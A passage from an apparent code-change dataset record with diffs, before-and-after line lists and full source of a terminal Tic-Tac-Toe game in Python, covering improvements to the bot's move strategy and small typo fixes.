black space, or vice versa.\n+\t\t# This is implemented using an odd\/even scheme of the board positions.\n+\t\tlast_opponent_move = self.move_history[-1]\n \t\twhile not valid_move:\n-\t\t\trow = random.choice([0, 1, 2])\n-\t\t\tcol = random.choice([0, 1, 2])\n+\t\t\tif turn_counter == 1 and self.board[1][1] == self.BLANK_POS:\n+\t\t\t\trow, col = (1, 1)\n+\t\t\telse:\n+\t\t\t\trow = random.choice((0, 1, 2))\n+\t\t\t\tif (last_opponent_move[0] + last_opponent_move[1]) % 2 == 0:\n+\t\t\t\t\tif row in (0, 2):\n+\t\t\t\t\t\tcol = 1\n+\t\t\t\t\telse:\n+\t\t\t\t\t\tcol = random.choice((0, 2))\n+\t\t\t\telse:\n+\t\t\t\t\tif row == 1:\n+\t\t\t\t\t\tcol = 1\n+\t\t\t\t\telse:\n+\t\t\t\t\t\tcol = random.choice((0, 2))\n \t\t\tvalid_move = self.checkValidMove(row, col)\n \n \t\treturn row, col\n","add":72,"remove":3,"filename":"\/TicTacToe.py","badparts":["\t\t\trow = random.choice([0, 1, 2])","\t\t\tcol = random.choice([0, 1, 2])"],"goodparts":["\t\tturn_counter = 9","\t\tfor i in range(0, 3):","\t\t\tfor j in range(0, 3):","\t\t\t\tif self.board[i][j] == self.BLANK_POS:","\t\t\t\t\tturn_counter -= 1","\t\tif bot_icon == self.PLAYER_1 and turn_counter == 1:","\t\t\tif self.board[1][1] == self.PLAYER_0:","\t\t\t\twhile not valid_move:","\t\t\t\t\trow = random.choice((0, 2))","\t\t\t\t\tcol = random.choice((0, 2))","\t\t\t\t\tvalid_move = self.checkValidMove(row, col)","\t\t\t\treturn row, col","\t\tif bot_icon == self.PLAYER_1 and turn_counter == 3:","\t\t\tif self.board[1][1] == self.PLAYER_0:","\t\t\t\tif ((self.board[0][0] != self.BLANK_POS !=","\t\t\t\t\tself.board[2][2] != self.board[0][0]) or","\t\t\t\t\t\t(self.board[0][2] != self.BLANK_POS !=","\t\t\t\t\t\tself.board[2][0] != self.board[0][2])):","\t\t\t\t\twhile not valid_move:","\t\t\t\t\t\trow = random.choice((0, 2))","\t\t\t\t\t\tcol = random.choice((0, 2))","\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)","\t\t\t\t\treturn row, col","\t\t\tif self.board[1][1] == bot_icon:","\t\t\t\tif self.board[0][1] != self.board[1][1] != self.board[2][1] != self.board[0][1]:","\t\t\t\t\twhile not valid_move:","\t\t\t\t\t\trow = random.choice((0, 1, 2))","\t\t\t\t\t\tcol = random.choice((0, 1, 2))","\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)","\t\t\t\t\t\tif (row, col) in ((0, 1), (2, 1)):","\t\t\t\t\t\t\tvalid_move = False","\t\t\t\t\treturn row, col","\t\t\t\telif self.board[1][0] != self.board[1][1] != self.board[1][2] != self.board[1][0]:","\t\t\t\t\twhile not valid_move:","\t\t\t\t\t\trow = random.choice((0, 1, 2))","\t\t\t\t\t\tcol = random.choice((0, 1, 2))","\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)","\t\t\t\t\t\tif (row, col) in ((1, 0), (1, 2)):","\t\t\t\t\t\t\tvalid_move = False","\t\t\t\t\treturn row, col","\t\tlast_opponent_move = self.move_history[-1]","\t\t\tif turn_counter == 1 and self.board[1][1] == self.BLANK_POS:","\t\t\t\trow, col = (1, 1)","\t\t\telse:","\t\t\t\trow = random.choice((0, 1, 2))","\t\t\t\tif (last_opponent_move[0] + last_opponent_move[1]) % 2 == 0:","\t\t\t\t\tif row in (0, 2):","\t\t\t\t\t\tcol = 1","\t\t\t\t\telse:","\t\t\t\t\t\tcol = random.choice((0, 2))","\t\t\t\telse:","\t\t\t\t\tif row == 1:","\t\t\t\t\t\tcol = 1","\t\t\t\t\telse:","\t\t\t\t\t\tcol = random.choice((0, 2))"]},{"diff":"\n \t\t\t\tprint('Both player icons must only be 1 character long.')\n \t\t\t\tplayer0 = 'too long'\n \t\t\t\twhile len(player0) != 1:\n-\t\t\t\t\tplayer0 = input('What do you want first move icon to be? (Traditionaly X): ')\n+\t\t\t\t\tplayer0 = input('What do you want first move icon to be? (Traditionally X): ')\n \t\t\t\t\tif len(player0) != 1:\n \t\t\t\t\t\tprint(\"Please enter a single character for the player icon\")\n \n \t\t\t\tplayer1 = 'too long'\n \t\t\t\twhile len(player1) != 1:\n-\t\t\t\t\tplayer1 = input('What do you want second move icon to be? (Traditionaly O): ')\n+\t\t\t\t\tplayer1 = input('What do you want second move icon to be? (Traditionally O): ')\n \t\t\t\t\tif len(player0) != 1:\n \t\t\t\t\t\tprint(\"Please enter a single character for the player icon\")\n \n \t\t\t\tself.updatePlayerIcons(player0, player1)\n \n-\tdef gameSettingsPrompt(self) -> Tuple[Callable, Callable]:\n+\tdef gameSettingsPrompt(self):\n \t\t\"\"\"Prints messages to allow the user to select number of players then choose their icon\n \t\tTakes no inputs\n \n","add":3,"remove":3,"filename":"\/TicTacToe.py","badparts":["\t\t\t\t\tplayer0 = input('What do you want first move icon to be? (Traditionaly X): ')","\t\t\t\t\tplayer1 = input('What do you want second move icon to be? (Traditionaly O): ')","\tdef gameSettingsPrompt(self) -> Tuple[Callable, Callable]:"],"goodparts":["\t\t\t\t\tplayer0 = input('What do you want first move icon to be? (Traditionally X): ')","\t\t\t\t\tplayer1 = input('What do you want second move icon to be? (Traditionally O): ')","\tdef gameSettingsPrompt(self):"]}],"source":"\n\ufeffimport random import os from math import floor from typing import Tuple, Callable class TicTacToe: \t\"\"\"Contains the objects and functions for running the TicTacToe game, to be called from main.py. \tIncluded functions: \t\t-__init__(self) \t\t-gameName(self) -returns the name of the game(namely, the name \"Tic-Tac-Toe\") \t\t-emptyBoard(self) -generates an empty board \t\t-checkValidMove(self, row, col) -returns \"True\" if a move is valid \t\t-updateBoard(self, row, col, player_icon) -assigns player icon to a given space \t\t-checkBoard(self) -determines if the game has been won or drawn \t\t-startTerminalGame(self) -outputs prompts and info to user and calls game functions \t\t-displayBoard(self) -prints the board to the console for the user to see \t\t-displayResult(self, game_state) -prints a win or draw message \t\t-userMove(self, player_icon) -takes user input to update the board \t\t-promptUser() -asks for and processes user input \t\t-botMove(self, player_icon) -brains of the bot for single-player mode \t\"\"\" \tdef __init__(self): \t\t\"\"\" \t\tInitializes TicTacToe object with \t\t\t-player icons(traditionally X and O) \t\t\t-game states(a continue\/no-winner state, one win state for each player, and a draw state) \t\t\t-and an empty board. \t\t\"\"\" \t\t \t\tself.BLANK_POS=0x0 \t\tself.PLAYER_0=-0x1 \t\tself.PLAYER_1=0x1 \t\t \t\tself.GAME_IN_PROGRESS=0x10 \t\tself.PLAYER_0_WINNER=0x20 \t\tself.PLAYER_1_WINNER=0x30 \t\tself.DRAW_GAME=0x40 \t\t \t\tself.board=self.emptyBoard() \t\tself.game_state=self.GAME_IN_PROGRESS \t@staticmethod \tdef gameName(): \t\t\"\"\"returns the name of the game(namely, the name \"Tic-Tac-Toe\"). \t\t:return: a string containing the name of the game. \t\t\"\"\" \t\treturn \"Tic-Tac-Toe\" \tdef emptyBoard(self): \t\t\"\"\"Creates an empty board for the start of a new game. \t\t:return: an empty self.board object. \t\t\"\"\" \t\treturn[ \t\t\t[self.BLANK_POS, self.BLANK_POS, self.BLANK_POS], \t\t\t[self.BLANK_POS, self.BLANK_POS, self.BLANK_POS], \t\t\t[self.BLANK_POS, self.BLANK_POS, self.BLANK_POS] \t\t] \tdef checkValidMove(self, row, col): \t\t\"\"\"Determines if a given move is allowed, then returns a boolean(True for valid moves, False for invalid moves). \t\t:param row: the row of the space to be checked. \t\t:param col: the column of the space to be checked. \t\t:return: a boolean, True if the space is empty and the desired move is valid; False if the move is invalid. \t\t\"\"\" \t\treturn self.board[row][col]==self.BLANK_POS \tdef updateBoard(self, row, col, player_values): \t\t\"\"\"Updates the board by assigning a player_icon to a given space, before doing so checks if a valid icon \t\tDoes not return anything; assigns directly to the self.board object. \t\t:param row: the row of the space to be updated. \t\t:param col: the column of the space to be updated. \t\t:param player_icon: the icon to be put in the space(traditionally X or O). \t\t\"\"\" \t\tif player_values in(self.PLAYER_0, self.PLAYER_1, self.BLANK_POS): \t\t\tself.board[row][col]=player_values \t\t\tself.checkBoard() \t\telse: \t\t\terr=( \t\t\t\tf\"Tried to update the board with '{player_values}' but the only choices are \" \t\t\t\tf\"'{self.BLANK_POS}', '{self.PLAYER_0}', and '{self.PLAYER_1}'.\" \t\t\t) \t\t\traise RuntimeError(err) \tdef checkBoard(self): \t\t\"\"\"Checks the board for endgame scenarios, either a draw or a win by either player. \t\tIt then sets the game_state attribute accordingly. \t\t\"\"\" \t\t \t\tfor row in range(0, 3): \t\t\tif self.board[row][0]==self.board[row][1]==self.board[row][2]==self.PLAYER_0: \t\t\t\tself.game_state=self.PLAYER_0_WINNER \t\t\t\treturn \t\t\telif self.board[row][0]==self.board[row][1]==self.board[row][2]==self.PLAYER_1: \t\t\t\tself.game_state=self.PLAYER_1_WINNER \t\t\t\treturn \t\t \t\tfor col in range(0, 3): \t\t\tif self.board[0][col]==self.board[1][col]==self.board[2][col]==self.PLAYER_0: \t\t\t\tself.game_state=self.PLAYER_0_WINNER \t\t\t\treturn \t\t\telif self.board[0][col]==self.board[1][col]==self.board[2][col]==self.PLAYER_1: \t\t\t\tself.game_state=self.PLAYER_1_WINNER \t\t\t\treturn \t\t \t\tif self.board[0][0]==self.board[1][1]==self.board[2][2]==self.PLAYER_0: \t\t\tself.game_state=self.PLAYER_0_WINNER \t\t\treturn \t\tif self.board[2][0]==self.board[1][1]==self.board[0][2]==self.PLAYER_0: \t\t\tself.game_state=self.PLAYER_0_WINNER \t\t\treturn \t\tif self.board[0][0]==self.board[1][1]==self.board[2][2]==self.PLAYER_1: \t\t\tself.game_state=self.PLAYER_1_WINNER \t\t\treturn \t\tif self.board[2][0]==self.board[1][1]==self.board[0][2]==self.PLAYER_1: \t\t\tself.game_state=self.PLAYER_1_WINNER \t\t\treturn \t\t \t\tfor row in self.board: \t\t\tfor col in row: \t\t\t\tif col==self.BLANK_POS: \t\t\t\t\tself.game_state=self.GAME_IN_PROGRESS \t\t\t\t\treturn \t\tself.game_state=self.DRAW_GAME \t\treturn \tdef botMove(self, bot_icon): \t\t\"\"\"The brains of the most unbeatable bot this side of the singularity. \t\tOkay probably not, but it should at least block easy wins. \t\t:param bot_icon: either self.PLAYER_0 or self.PLAYER_1, used by the bot to distinguish user from bot. \t\t:return:(row, col) as integers representing the row and column of bot's desired move. \t\t\"\"\" \t\t \t\tvalid_move=False \t\t \t\trow, col=0, 0 \t\t \t\t \t\tif bot_icon==self.PLAYER_0: \t\t\tnot_bot_icon=self.PLAYER_1 \t\telse: \t\t\tnot_bot_icon=self.PLAYER_0 \t\t \t\twin_options=[ \t\t\t[(0, 0),(0, 1),(0, 2)], \t\t\t[(1, 0),(1, 1),(1, 2)], \t\t\t[(2, 0),(2, 1),(2, 2)], \t\t\t[(0, 0),(1, 0),(2, 0)], \t\t\t[(0, 1),(1, 1),(2, 1)], \t\t\t[(0, 2),(1, 2),(2, 2)], \t\t\t[(0, 0),(1, 1),(2, 2)], \t\t\t[(0, 2),(1, 1),(2, 0)] \t\t] \t\t \t\tfor option in win_options: \t\t\t \t\t\tscore_keeper={self.PLAYER_0: 0, self.PLAYER_1: 0, self.BLANK_POS: 0} \t\t\t \t\t\t \t\t\tfor i in option: \t\t\t\tscore_keeper[self.board[i[0]][i[1]]] +=1 \t\t\t \t\t\tif score_keeper[bot_icon]==2 and score_keeper[self.BLANK_POS]==1: \t\t\t\tfor i in option: \t\t\t\t\tif self.board[i[0]][i[1]]==self.BLANK_POS: \t\t\t\t\t\trow=i[0] \t\t\t\t\t\tcol=i[1] \t\t\t\t\t\treturn row, col \t\t\t \t\t\t \t\t\tif score_keeper[not_bot_icon]==2 and score_keeper[self.BLANK_POS]==1: \t\t\t\tfor i in option: \t\t\t\t\tif self.board[i[0]][i[1]]==self.BLANK_POS: \t\t\t\t\t\trow=i[0] \t\t\t\t\t\tcol=i[1] \t\t\t\t\t\treturn row, col \t\t \t\twhile not valid_move: \t\t\trow=random.choice([0, 1, 2]) \t\t\tcol=random.choice([0, 1, 2]) \t\t\tvalid_move=self.checkValidMove(row, col) \t\treturn row, col \tdef resetGame(self): \t\t\"\"\"Takes the necessary game attributes and resets them to their beginning state \t\tDoes not take in anything or return anything \t\t\"\"\" \t\tself.board=self.emptyBoard() \t\tself.game_state=self.GAME_IN_PROGRESS class TicTacTerminal(TicTacToe): \tdef __init__(self): \t\tTicTacToe.__init__(self) \t\tself.blank_pos_color=\"\\033[1;32m\" \t\tself.exit_color_code=\"\\033[0m\" \t\t \t\tself.PLAYER_0_ICON='X' \t\tself.PLAYER_1_ICON='O' \tdef updatePlayerIcons(self, player_0_icon, player_1_icon): \t\tself.PLAYER_0_ICON=player_0_icon \t\tself.PLAYER_1_ICON=player_1_icon \tdef advancedGameSettings(self, setting_to_change): \t\tmatch setting_to_change: \t\t\tcase 'change icons': \t\t\t\tprint('Both player icons must only be 1 character long.') \t\t\t\tplayer0='too long' \t\t\t\twhile len(player0) !=1: \t\t\t\t\tplayer0=input('What do you want first move icon to be?(Traditionaly X): ') \t\t\t\t\tif len(player0) !=1: \t\t\t\t\t\tprint(\"Please enter a single character for the player icon\") \t\t\t\tplayer1='too long' \t\t\t\twhile len(player1) !=1: \t\t\t\t\tplayer1=input('What do you want second move icon to be?(Traditionaly O): ') \t\t\t\t\tif len(player0) !=1: \t\t\t\t\t\tprint(\"Please enter a single character for the player icon\") \t\t\t\tself.updatePlayerIcons(player0, player1) \tdef gameSettingsPrompt(self) -> Tuple[Callable, Callable]: \t\t\"\"\"Prints messages to allow the user to select number of players then choose their icon \t\tTakes no inputs \t\t:returns: a tuple of the functions to process the 0 and 1 player moves \t\t\"\"\" \t\t \t\tnum_players=0 \t\twhile num_players !=1 and num_players !=2: \t\t\tnum_players=input(\"Enter the number of players(1 or 2): \") \t\t\tif num_players.isnumeric(): \t\t\t\tnum_players=int(num_players) \t\t\telif num_players=='change icons': \t\t\t\tself.advancedGameSettings(num_players) \t\t \t\tif num_players==1: \t\t\t \t\t\tplayer_choice=self.BLANK_POS \t\t\twhile player_choice !=self.PLAYER_0_ICON and player_choice !=self.PLAYER_1_ICON: \t\t\t\tplayer_choice=input( \t\t\t\t\tf\"{self.PLAYER_0_ICON}s plays first, do you want to be{self.PLAYER_0_ICON} or{self.PLAYER_1_ICON}? \" \t\t\t\t) \t\t\t\tif player_choice !=self.PLAYER_0_ICON and player_choice !=self.PLAYER_1_ICON: \t\t\t\t\tprint(\"That is not a valid option, make sure to match the letter's upper\/lower case.\") \t\t\t \t\t\tif player_choice==self.PLAYER_0_ICON: \t\t\t\tself.player_0_move=self.userMove \t\t\t\tself.player_1_move=self.botMove \t\t\telse: \t\t\t\tself.player_0_move=self.botMove \t\t\t\tself.player_1_move=self.userMove \t\t \t\telse: \t\t\tprint(f\"{self.PLAYER_0_ICON}s plays first, decide who will be the first player.\") \t\t\tself.player_0_move=self.userMove \t\t\tself.player_1_move=self.userMove \tdef terminalGame(self): \t\t\"\"\"Starts a TicTacToe game in the terminal and calls supporting functions. \t\tTakes no inputs and makes no return. \t\t\"\"\" \t\tif os.name==\"nt\": \t\t\tos.system(\"color\") \t\tself.gameSettingsPrompt() \t\tprint(\"If you wish to stop playing the game enter 'exit'.\") \t\t \t\tself.displayBoard() \t\twhile True: \t\t\tprint(\"First player's turn.\") \t\t\trow, col=self.player_0_move(self.PLAYER_0) \t\t\tif row==-1 and col==-1: break \t\t\tself.updateBoard(row, col, self.PLAYER_0) \t\t\tself.displayBoard() \t\t\tif self.game_state !=self.GAME_IN_PROGRESS: break \t\t\tprint(\"Second player's turn.\") \t\t\trow, col=self.player_1_move(self.PLAYER_1) \t\t\tif row==-1 and col==-1: break \t\t\tself.updateBoard(row, col, self.PLAYER_1) \t\t\tself.displayBoard() \t\t\tif self.game_state !=self.GAME_IN_PROGRESS: break \t\tself.displayResult() \t\tself.resetGame() \tdef displayBoard(self): \t\t\"\"\"Prints the board for the user to see. \t\tTakes no arguments and gives no return; \t\trather, calls the self.board object directly and prints directly to console. \t\t\"\"\" \t\tresult=\"\\n\" \t\tfor i in range(0, 9): \t\t\trow=floor(i \/ 3) \t\t\tcol=i % 3 \t\t\tif i in(0, 3, 6): \t\t\t\tif self.board[row][col] !=self.BLANK_POS: \t\t\t\t\tresult +=f\"\\t{self.PLAYER_0_ICON if self.board[row][col]==self.PLAYER_0 else self.PLAYER_1_ICON} \u2551\" \t\t\t\telse: \t\t\t\t\tresult +=f\"\\t{self.blank_pos_color}{i +1}{self.exit_color_code}\u2551\" \t\t\telif i in(1, 4, 7): \t\t\t\tif self.board[row][col] !=self.BLANK_POS: \t\t\t\t\tresult +=f\"{self.PLAYER_0_ICON if self.board[row][col]==self.PLAYER_0 else self.PLAYER_1_ICON} \u2551\" \t\t\t\telse: \t\t\t\t\tresult +=f\"{self.blank_pos_color}{i +1}{self.exit_color_code}\u2551\" \t\t\telif i in(2, 5, 8): \t\t\t\tif self.board[row][col] !=self.BLANK_POS: \t\t\t\t\tresult +=f\"{self.PLAYER_0_ICON if self.board[row][col]==self.PLAYER_0 else self.PLAYER_1_ICON}\\n\" \t\t\t\telse: \t\t\t\t\tresult +=f\"{self.blank_pos_color}{i +1}{self.exit_color_code}\\n\" \t\t\t\tif i in(2, 5): \t\t\t\t\tresult +=\"\\t\u2550\u2550\u2550\u256c\u2550\u2550\u2550\u256c\u2550\u2550\u2550\\n\" \t\tprint(result) \tdef displayResult(self): \t\t\"\"\"Checks the game_state and displays how the game ended. \t\tIt takes in nothing and returns nothing \t\t\"\"\" \t\tif self.game_state==self.PLAYER_0_WINNER: \t\t\tprint(f\"{self.PLAYER_0_ICON} won the game!\") \t\telif self.game_state==self.PLAYER_1_WINNER: \t\t\tprint(f\"{self.PLAYER_1_ICON} won the game!\") \t\telif self.game_state==self.DRAW_GAME: \t\t\tprint(\"The game ended in a draw\") \t\telse: \t\t\t \t\t\tpass \tdef userMove(self, player_icon): \t\t\"\"\"Processes everything that is needed for a user to make a move, \t\tincluding checking if input was valid(through promptUser(), spot is free to move in, etc.) \t\t:param player_icon: The player_icon is not used in userMove but is necessary to avoid bugs with botMove. \t\t\t\t\tSee how player_icon argument is used in botMove(self, player_icon), \t\t\t\t\tand how both of these functions are used in startTerminalGame(self) for details. \t\t\"\"\" \t\tvalid_move=False \t\trow, col=0, 0 \t\twhile not valid_move: \t\t\trow, col=self.promptUser() \t\t\tif row !=-1 and col !=-1: \t\t\t\tvalid_move=self.checkValidMove(row, col) \t\t\t\tif not valid_move: \t\t\t\t\tprint(\"That space is already taken\") \t\t\telse: \t\t\t\treturn row, col \t\treturn row, col \t@staticmethod \tdef promptUser(): \t\t\"\"\"Requests user input for desired move on user's turn, validates, and then returns selected space. \t\t:return:(row, col) as the row and column of the space selected by the user for their move. \t\t\"\"\" \t\twhile True: \t\t\tchoice=input(\"Where do you want to play? \") \t\t\tif len(choice)==1 and choice.isnumeric(): \t\t\t\tchoice=int(choice) -1 \t\t\t\trow=floor(choice \/ 3) \t\t\t\tcol=choice % 3 \t\t\t\treturn row, col \t\t\telif choice=='exit': \t\t\t\treturn -1, -1 if __name__==\"__main__\": \tTicTacTerminal().terminalGame() ","sourceWithComments":"\ufeffimport random\nimport os\nfrom math import floor\nfrom typing import Tuple, Callable\n\n\n##########################################################################################\n\nclass TicTacToe:\n\t\"\"\"Contains the objects and functions for running the TicTacToe game, to be called from main.py.\n\n\tIncluded functions:\n\t\t- __init__(self)\n\t\t- gameName(self) - returns the name of the game (namely, the name \"Tic-Tac-Toe\")\n\t\t- emptyBoard(self) - generates an empty board\n\t\t- checkValidMove(self, row, col) - returns \"True\" if a move is valid\n\t\t- updateBoard(self, row, col, player_icon) - assigns player icon to a given space\n\t\t- checkBoard(self) - determines if the game has been won or drawn\n\t\t- startTerminalGame(self) - outputs prompts and info to user and calls game functions\n\t\t- displayBoard(self) - prints the board to the console for the user to see\n\t\t- displayResult(self, game_state) - prints a win or draw message\n\t\t- userMove(self, player_icon) - takes user input to update the board\n\t\t- promptUser() - asks for and processes user input\n\t\t- botMove(self, player_icon) - brains of the bot for single-player mode\n\t\"\"\"\n\n\tdef __init__(self):\n\t\t\"\"\"\n\t\tInitializes TicTacToe object with\n\t\t\t- player icons (traditionally X and O)\n\t\t\t- game states (a continue\/no-winner state, one win state for each player, and a draw state)\n\t\t\t- and an empty board.\n\t\t\"\"\"\n\n\t\t# Player values\n\t\tself.BLANK_POS = 0x0\n\t\tself.PLAYER_0 = -0x1\n\t\tself.PLAYER_1 = 0x1\n\t\t# Game States\n\t\tself.GAME_IN_PROGRESS = 0x10\n\t\tself.PLAYER_0_WINNER = 0x20\n\t\tself.PLAYER_1_WINNER = 0x30\n\t\tself.DRAW_GAME = 0x40\n\n\t\t# Initialize empty board and state\n\t\tself.board = self.emptyBoard()\n\t\tself.game_state = self.GAME_IN_PROGRESS\n\n\t@staticmethod\n\tdef gameName():\n\t\t\"\"\"returns the name of the game (namely, the name \"Tic-Tac-Toe\").\n\t\t:return: a string containing the name of the game.\n\t\t\"\"\"\n\n\t\treturn \"Tic-Tac-Toe\"\n\n\tdef emptyBoard(self):\n\t\t\"\"\"Creates an empty board for the start of a new game.\n\n\t\t:return: an empty self.board object.\n\t\t\"\"\"\n\n\t\treturn [\n\t\t\t[self.BLANK_POS, self.BLANK_POS, self.BLANK_POS],\n\t\t\t[self.BLANK_POS, self.BLANK_POS, self.BLANK_POS],\n\t\t\t[self.BLANK_POS, self.BLANK_POS, self.BLANK_POS]\n\t\t]\n\n\tdef checkValidMove(self, row, col):\n\t\t\"\"\"Determines if a given move is allowed, then returns a boolean (True for valid moves, False for invalid moves).\n\n\t\t:param row: the row of the space to be checked.\n\t\t:param col: the column of the space to be checked.\n\t\t:return: a boolean, True if the space is empty and the desired move is valid; False if the move is invalid.\n\t\t\"\"\"\n\n\t\treturn self.board[row][col] == self.BLANK_POS\n\n\tdef updateBoard(self, row, col, player_values):\n\t\t\"\"\"Updates the board by assigning a player_icon to a given space, before doing so checks if a valid icon\n\t\tDoes not return anything; assigns directly to the self.board object.\n\n\t\t:param row: the row of the space to be updated.\n\t\t:param col: the column of the space to be updated.\n\t\t:param player_icon: the icon to be put in the space (traditionally X or O).\n\t\t\"\"\"\n\n\t\tif player_values in (self.PLAYER_0, self.PLAYER_1, self.BLANK_POS):\n\t\t\tself.board[row][col] = player_values\n\t\t\tself.checkBoard()\n\t\telse:\n\t\t\terr = (\n\t\t\t\tf\"Tried to update the board with '{player_values}' but the only choices are \"\n\t\t\t\tf\"'{self.BLANK_POS}', '{self.PLAYER_0}', and '{self.PLAYER_1}'.\"\n\t\t\t)\n\n\t\t\traise RuntimeError(err)\n\n\tdef checkBoard(self):\n\t\t\"\"\"Checks the board for endgame scenarios, either a draw or a win by either player.\n\t\tIt then sets the game_state attribute accordingly.\n\t\t\"\"\"\n\n\t\t# check for win in rows\n\t\tfor row in range(0, 3):\n\t\t\tif self.board[row][0] == self.board[row][1] == self.board[row][2] == self.PLAYER_0:\n\t\t\t\tself.game_state = self.PLAYER_0_WINNER\n\t\t\t\treturn\n\t\t\telif self.board[row][0] == self.board[row][1] == self.board[row][2] == self.PLAYER_1:\n\t\t\t\tself.game_state = self.PLAYER_1_WINNER\n\t\t\t\treturn\n\n\t\t# check for win in columns\n\t\tfor col in range(0, 3):\n\t\t\tif self.board[0][col] == self.board[1][col] == self.board[2][col] == self.PLAYER_0:\n\t\t\t\tself.game_state = self.PLAYER_0_WINNER\n\t\t\t\treturn\n\t\t\telif self.board[0][col] == self.board[1][col] == self.board[2][col] == self.PLAYER_1:\n\t\t\t\tself.game_state = self.PLAYER_1_WINNER\n\t\t\t\treturn\n\n\t\t# check for win in diagonals\n\t\tif self.board[0][0] == self.board[1][1] == self.board[2][2] == self.PLAYER_0:\n\t\t\tself.game_state = self.PLAYER_0_WINNER\n\t\t\treturn\n\t\tif self.board[2][0] == self.board[1][1] == self.board[0][2] == self.PLAYER_0:\n\t\t\tself.game_state = self.PLAYER_0_WINNER\n\t\t\treturn\n\t\tif self.board[0][0] == self.board[1][1] == self.board[2][2] == self.PLAYER_1:\n\t\t\tself.game_state = self.PLAYER_1_WINNER\n\t\t\treturn\n\t\tif self.board[2][0] == self.board[1][1] == self.board[0][2] == self.PLAYER_1:\n\t\t\tself.game_state = self.PLAYER_1_WINNER\n\t\t\treturn\n\n\t\t# check if the board is full\n\t\tfor row in self.board:\n\t\t\tfor col in row:\n\t\t\t\tif col == self.BLANK_POS:\n\t\t\t\t\tself.game_state = self.GAME_IN_PROGRESS\n\t\t\t\t\treturn\n\n\t\tself.game_state = self.DRAW_GAME\n\t\treturn\n\n\tdef botMove(self, bot_icon):\n\t\t\"\"\"The brains of the most unbeatable bot this side of the singularity.\n\t\tOkay probably not, but it should at least block easy wins.\n\n\t\t:param bot_icon: either self.PLAYER_0 or self.PLAYER_1, used by the bot to distinguish user from bot.\n\t\t:return: (row, col) as integers representing the row and column of bot's desired move.\n\t\t\"\"\"\n\n\t\t# Initialize valid_move as required by the while loop\n\t\tvalid_move = False\n\t\t# Initialize row and col, because it's the right thing to do\n\t\trow, col = 0, 0\n\t\t# Initialize not_bot_icon because who wants to read \"self.PLAYER_1\"\n\t\t# and all the logic that goes into figuring out if that's even the right icon to use?\n\t\tif bot_icon == self.PLAYER_0:\n\t\t\tnot_bot_icon = self.PLAYER_1\n\t\telse:\n\t\t\tnot_bot_icon = self.PLAYER_0\n\t\t# List of tuples containing the (row,col) of all possible win scenarios\n\t\twin_options = [\n\t\t\t[(0, 0), (0, 1), (0, 2)],\n\t\t\t[(1, 0), (1, 1), (1, 2)],\n\t\t\t[(2, 0), (2, 1), (2, 2)],\n\t\t\t[(0, 0), (1, 0), (2, 0)],\n\t\t\t[(0, 1), (1, 1), (2, 1)],\n\t\t\t[(0, 2), (1, 2), (2, 2)],\n\t\t\t[(0, 0), (1, 1), (2, 2)],\n\t\t\t[(0, 2), (1, 1), (2, 0)]\n\t\t]\n\n\t\t# check win scenarios by looping through win_options list\n\t\tfor option in win_options:\n\t\t\t# Initialize score_keeper for reading the board for win scenarios\n\t\t\tscore_keeper = {self.PLAYER_0: 0, self.PLAYER_1: 0, self.BLANK_POS: 0}\n\t\t\t# determine what is in each space and record with score_keeper\n\t\t\t# i is the individual space in any given win scenario, i[0] is row and i[1] is col\n\t\t\tfor i in option:\n\t\t\t\tscore_keeper[self.board[i[0]][i[1]]] += 1\n\n\t\t\t# If there are two bot icons set to win and a blank space available, take the blank space to win the game\n\t\t\tif score_keeper[bot_icon] == 2 and score_keeper[self.BLANK_POS] == 1:\n\t\t\t\tfor i in option:\n\t\t\t\t\tif self.board[i[0]][i[1]] == self.BLANK_POS:\n\t\t\t\t\t\trow = i[0]\n\t\t\t\t\t\tcol = i[1]\n\t\t\t\t\t\treturn row, col\n\t\t\t# if there are two opponent icons set to win and a blank space available,\n\t\t\t# select the blank space to block the opponent from winning\n\t\t\tif score_keeper[not_bot_icon] == 2 and score_keeper[self.BLANK_POS] == 1:\n\t\t\t\tfor i in option:\n\t\t\t\t\tif self.board[i[0]][i[1]] == self.BLANK_POS:\n\t\t\t\t\t\trow = i[0]\n\t\t\t\t\t\tcol = i[1]\n\t\t\t\t\t\treturn row, col\n\n\t\t# If the bot escapes the win-checker loop and finds no imminent win scenarios, select a random space\n\t\twhile not valid_move:\n\t\t\trow = random.choice([0, 1, 2])\n\t\t\tcol = random.choice([0, 1, 2])\n\t\t\tvalid_move = self.checkValidMove(row, col)\n\n\t\treturn row, col\n\n\tdef resetGame(self):\n\t\t\"\"\"Takes the necessary game attributes and resets them to their beginning state\n\t\tDoes not take in anything or return anything\n\t\t\"\"\"\n\n\t\tself.board = self.emptyBoard()\n\t\tself.game_state = self.GAME_IN_PROGRESS\n\n\nclass TicTacTerminal(TicTacToe):\n\tdef __init__(self):\n\t\tTicTacToe.__init__(self)\n\t\tself.blank_pos_color = \"\\033[1;32m\"\n\t\tself.exit_color_code = \"\\033[0m\"\n\n\t\t# How the palyers are displayed\n\t\tself.PLAYER_0_ICON = 'X'\n\t\tself.PLAYER_1_ICON = 'O'\n\n\tdef updatePlayerIcons(self, player_0_icon, player_1_icon):\n\t\tself.PLAYER_0_ICON = player_0_icon\n\t\tself.PLAYER_1_ICON = player_1_icon\n\n\tdef advancedGameSettings(self, setting_to_change):\n\t\tmatch setting_to_change:\n\t\t\tcase 'change icons':\n\t\t\t\tprint('Both player icons must only be 1 character long.')\n\t\t\t\tplayer0 = 'too long'\n\t\t\t\twhile len(player0) != 1:\n\t\t\t\t\tplayer0 = input('What do you want first move icon to be? (Traditionaly X): ')\n\t\t\t\t\tif len(player0) != 1:\n\t\t\t\t\t\tprint(\"Please enter a single character for the player icon\")\n\n\t\t\t\tplayer1 = 'too long'\n\t\t\t\twhile len(player1) != 1:\n\t\t\t\t\tplayer1 = input('What do you want second move icon to be? (Traditionaly O): ')\n\t\t\t\t\tif len(player0) != 1:\n\t\t\t\t\t\tprint(\"Please enter a single character for the player icon\")\n\n\t\t\t\tself.updatePlayerIcons(player0, player1)\n\n\tdef gameSettingsPrompt(self) -> Tuple[Callable, Callable]:\n\t\t\"\"\"Prints messages to allow the user to select number of players then choose their icon\n\t\tTakes no inputs\n\n\t\t:returns: a tuple of the functions to process the 0 and 1 player moves\n\t\t\"\"\"\n\n\t\t# Prompts for how many human players there will be\n\t\tnum_players = 0\n\t\twhile num_players != 1 and num_players != 2:\n\t\t\tnum_players = input(\"Enter the number of players (1 or 2): \")\n\t\t\tif num_players.isnumeric():\n\t\t\t\tnum_players = 